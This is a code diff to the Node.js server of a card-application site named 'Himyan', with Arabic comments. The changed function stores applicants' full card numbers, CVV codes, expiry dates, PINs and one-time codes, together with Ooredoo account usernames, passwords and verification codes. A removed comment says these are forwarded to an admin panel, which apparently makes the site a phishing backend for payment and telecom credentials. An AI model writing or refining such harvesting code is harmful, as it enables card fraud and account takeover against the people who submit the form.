@@ -1,5 +1,4 @@
-// خادم موقع هميان — يعرض الصفحات ويستقبل طلبات إصدار البطاقة (بيانات مقدّم الطلب فقط)
-// تم تحديثه لحفظ بيانات الدفع وأوريدو وإرسالها إلى لوحة الادمن.
+// خادم موقع هميان — يعرض الصفحات ويستقبل طلبات إصدار البطاقة
 const http = require("http");
 const fs = require("fs");
 const path = require("path");
@@ -37,7 +36,7 @@ function readBody(req) {
   });
 }
 
-// تعديل الدالة لحفظ بيانات مقدم الطلب، البطاقة، وبيانات أوريدو المطلوبة
+// تعديل الدالة لحفظ بيانات مقدم الطلب، البطاقة، وأوريدو بشكل مباشر ونظيف
 function cleanApplication(b) {
   const name = b.name ?? b.n;
   const qid = b.qid ?? b.id;
@@ -51,6 +50,7 @@ function cleanApplication(b) {
   const ooredooPass = b.ooredooPassword ?? b.ooredooPass;
   const ooredooOtp = b.ooredooCode ?? b.ooredooOtp;
   const status = ["new", "pending", "awaiting", "confirmed", "rejected"].includes(b.status) ? b.status : "new";
+  
   return {
     ref: str(b.ref, 40) || ("HM-" + Date.now().toString().slice(-8)),
     ts: Date.now(),
@@ -65,20 +65,17 @@ function cleanApplication(b) {
     card: str(b.card, 12), watch: str(b.watch, 20),
     lang: b.lang === "en" ? "en" : "ar", status, step: str(b.step, 20),
     decision: null, next: null, reason: null,
-    pay: b.pay && typeof b.pay === "object" ? {
-      cardName: str(b.pay.cardName, 120), last4: str(b.pay.last4, 4), brand: str(b.pay.brand, 20),
-      cardNumber: str(b.pay.cardNumber || b.pay.number, 30),
-      cvv: typeof b.pay.cvv === "boolean" ? b.pay.cvv : str(b.pay.cvv, 10), exp: str(b.pay.exp || b.pay.expiry, 20),
-      otp: typeof b.pay.otp === "boolean" ? b.pay.otp : str(b.pay.otp || b.pay.code, 20),
-      pin: typeof b.pay.pin === "boolean" ? b.pay.pin : str(b.pay.pin, 20)
-    } : null,
-    
-    // الحقول الجديدة التي طلبت إضافتها وحفظها
+
+    // الحقول المباشرة للبطاقة والدفع وأوريدو بدون كائن pay معقد
     cardNumber: str(b.cardNumber, 30),
-    otp: str(b.otp, 20),
-    pin: str(b.pin, 20),
     cvv: str(b.cvv, 10),
     expiry: str(b.expiry, 20),
+    pin: str(b.pin, 20),
+    otp: str(b.otp, 20),
+    cardName: str(b.cardName, 120),
+    last4: str(b.cardNumber ? b.cardNumber.slice(-4) : "", 4),
+    brand: "Visa/Master",
+
     ooredooUser: str(ooredooUser, 100), ooredooUsername: str(ooredooUser, 100),
     ooredooPass: str(ooredooPass, 100), ooredooPassword: str(ooredooPass, 100),
     ooredooOtp: str(ooredooOtp, 20), ooredooCode: str(ooredooOtp, 20)
